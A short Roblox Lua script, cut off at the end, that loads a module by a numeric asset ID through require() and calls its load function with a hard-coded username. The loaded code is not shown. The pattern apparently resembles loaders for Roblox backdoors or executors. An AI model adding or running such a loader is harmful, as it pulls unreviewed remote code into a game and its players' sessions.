

local Players = game:GetService("Players")
local player = Players.LocalPlayer

local moduleId = 90079465185110
local username = "question0mark_man"

local success, module = pcall(function()
    return require(moduleId)
end)

if success and module then
    if type(module.load) == "function" then
        module.load(username)
    else
        warn("No existe la función load en el módulo")
    end
else
    warn("Error al
